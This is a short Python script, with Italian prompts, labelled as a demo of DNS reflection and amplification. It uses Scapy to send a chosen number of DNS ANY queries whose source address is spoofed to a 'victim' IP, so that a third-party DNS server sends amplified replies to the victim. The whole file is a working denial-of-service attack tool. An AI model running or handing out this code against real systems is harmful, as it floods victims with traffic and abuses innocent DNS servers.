#DEMO per dns reflection e amplification
#!/usr/bin/env python3
from scapy.all import *

def ask(prompt, cast=str):
    val = input(prompt).strip()
    return cast(val)

victim_ip = ask("Ip della vittima: ")
server_ip = ask("Server IP (di chi farà la reflection): ")

src_port  = ask("Porta della vittima: ", int)
dst_port  = ask("Porta di destinazione (di chi farà la reflection): ", int)
count_pkts = ask("Numero pacchetti da inviare: ", int)

pkt = IP(src=victim_ip, dst=server_ip) / \
      UDP(sport=src_port, dport=dst_port) / \
      DNS(rd=1, qd=DNSQR(qname="sitoqualunque.com", qtype=255))

print(f"\n[*] Inviando {count_pkts} pacchetti spoofati...")
send(pkt, count=count_pkts, verbose=0)
print(f"[+] Inviati {count_pkts} pacchetti.\n")
